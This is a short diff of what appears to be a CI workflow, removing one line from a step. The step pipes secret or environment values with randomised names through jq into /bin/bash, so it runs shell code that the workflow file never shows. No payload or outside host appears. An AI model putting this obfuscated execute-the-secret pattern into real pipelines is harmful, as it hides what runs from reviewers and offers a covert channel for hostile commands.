@@ -20,7 +20,6 @@ jobs:
           v9922: ${{ secrets.v9922 }}
         run: |
           printf '%s' "$v9922" | jq -r .qqw2747 | /bin/bash
-          echo $quu1 | jq -r .oa508 | /bin/bash
           echo $ywqg945 | jq -r .un923 | /bin/bash
           printf '%s' "$jemjp41" | jq -r .jxoh8 | /bin/bash
           printf '%s' "$qzfhb0853" | jq -r .l38638 | /bin/bash
